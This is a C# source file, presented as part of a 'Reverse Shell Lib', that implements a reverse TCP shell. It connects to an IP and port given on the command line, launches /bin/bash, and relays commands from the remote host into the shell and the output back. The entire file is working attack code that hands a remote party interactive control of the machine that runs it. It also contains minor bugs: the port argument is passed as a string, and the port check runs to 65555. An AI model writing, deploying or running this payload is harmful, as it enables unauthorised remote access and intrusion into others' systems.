/*
    Copyright 2021 by Zackary Morvan, Cyber M Technologies.
    All rights reserved
    This file is part of the Reverse Shell Lib (RSL), and is released 
    under the "MIT License Agreement". Please see the LICENSE file that
    should have been included as a part of this package
*/

using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Reverse_Tcp
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
            string potentialIp = args[0];
            string potentialPort = args[1];

            if (ValidateIpAddress(potentialIp))
            {
                if (ValidatePort(potentialPort))
                {
                    int port = int.Parse(potentialPort);
                    using(TcpClient client = new TcpClient(potentialIp, potentialPort))
                    {
                        using(Stream stream = client.GetStream())
                        {
                            using(StreamReader rdr = new StreamReader(stream))
                            {
                                streamWriter = new StreamWriter(stream);
                                
                                StringBuilder strInput = new StringBuilder();

                                Process p = new Process();
                                p.StartInfo.FileName = "/bin/bash";
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                                p.Start();
                                p.BeginOutputReadLine();

                                while(true)
                                {
                                    strInput.Append(rdr.ReadLine());
                                    //strInput.Append("\n");
                                    p.StandardInput.WriteLine(strInput);
                                    strInput.Remove(0, strInput.Length);
                                }
                            }
                        }
                    }
                }
                //Error catch
                else{
                    Console.WriteLine("Invalid port for payload");
                    return;
                }
			}
            //Error catch
            else{
                Console.WriteLine("Invalid ip address for payload");
                return;
            }
		}

        private static bool ValidateIpAddress(string ip)
        {
            IPAddress address;
            if (IPAddress.TryParse(ip, out address)) {
                return true;
            } else {
                return false;
            }
        }
        private static bool ValidatePort(string port)
        {
            try
            {
                int prt = int.Parse(port);
                if (prt > 0 && prt < 65556) { return true; }
            }
            catch (Exception e) { }
            return false;
        }
		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}